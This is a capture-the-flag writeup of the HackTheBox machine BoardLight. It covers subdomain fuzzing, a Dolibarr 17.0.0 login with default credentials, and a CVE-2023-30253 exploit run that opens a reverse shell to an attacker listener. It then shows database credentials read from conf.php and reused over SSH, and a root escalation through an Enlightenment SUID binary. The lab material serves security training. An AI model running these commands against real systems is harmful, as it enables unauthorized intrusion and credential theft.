# BoardLight — HackTheBox Machine Writeup

## 📌 Overview

- Platform: HackTheBox
- Target: BoardLight
- OS: Linux
- Difficulty: Easy

---

## 🔍 Enumeration

### Initial Port Scan

I began by performing a standard service enumeration scan:

nmap -T4 -sV -Pn -n -sC 10.x.x.x -v

The scan revealed two open ports:

22/tcp — OpenSSH 8.2p1  
80/tcp — Apache 2.4.41

Since only SSH and HTTP were exposed, the web application became the primary attack surface.

---

## 🌐 Web Enumeration

### Initial Website Inspection

Browsing port 80 showed a basic website with no obvious attack vectors.

Directory enumeration was performed:

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -u http://board.htb/FUZZ

No interesting endpoints were discovered.

---

## Virtual Host Enumeration

Since nothing useful was found, I attempted virtual host fuzzing:

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/combined_subdomains.txt -u http://board.htb -H "Host: FUZZ.board.htb"

This revealed a valid subdomain:

crm.board.htb

I added it locally:

echo "10.129.231.37 crm.board.htb" | sudo tee -a /etc/hosts

---

## 🔐 Dolibarr CMS Discovery

Accessing the new host showed a login panel for:

Dolibarr 17.0.0

This version information was visible on the login page.

---

## Default Credentials

Searching for Dolibarr default credentials revealed:

admin : admin

Using these credentials allowed successful login.

However, access was limited and many modules were disabled.

---

## ⚔️ Exploitation — CVE-2023-30253

Searching for vulnerabilities in Dolibarr 17.0.0 revealed a public exploit:

CVE-2023-30253 — Authenticated Remote Command Execution

Exploit used:

https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

---

### Exploit Execution

I ran the exploit:

python3 exploit.py http://crm.board.htb admin admin 10.10.14.43 4444

Listener:

nc -lvnp 4444

This successfully provided a reverse shell as:

www-data

---

## 🔎 Post-Exploitation Enumeration

### Locating Configuration Files

I navigated the web root:

cd /var/www/html/crm.board.htb/htdocs/conf

Found configuration file:

conf.php

---

### Extracting Credentials

Viewing the file revealed database credentials:

Database User: dolibarrowner  
Password: serverfun2$2023!!

---

## SSH Access

While enumerating users on the system, I discovered a user:

larissa

Using the recovered credentials:

ssh larissa@boardlight.htb

Login was successful, granting user shell access.

---

## 🚀 Privilege Escalation

### Sudo Check

Running:

sudo -l

No useful privileges were available.

---

### SUID Enumeration

Using LinEnum revealed several SUID binaries, including:

/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys

This binary appeared unusual and worth investigating.

---

## Exploit Research

Searching for exploits:

searchsploit enlightenment

Revealed:

Enlightenment v0.25.3 — Privilege Escalation

Exploit ID:

51180

---

## Root Exploitation

Using the exploit allowed privilege escalation to root.

After execution:

whoami

Returned:

root
- LinEnum
- Searchsploit
